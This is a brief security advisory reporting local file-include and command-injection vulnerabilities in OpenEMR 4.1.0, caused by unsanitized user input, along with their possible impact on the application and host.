OpenEMR is prone to local file-include and command-injection vulnerabilities because it fails to properly sanitize user-supplied input.

A remote attacker can exploit these issues to execute arbitrary shell commands with the privileges of the user running the application, obtain potentially sensitive information, and execute arbitrary local scripts in the context of the Web server process. This could allow the attacker to compromise the application and the computer; other attacks are also possible.

OpenEMR 4.1.0 is vulnerable; other versions may also be affected.
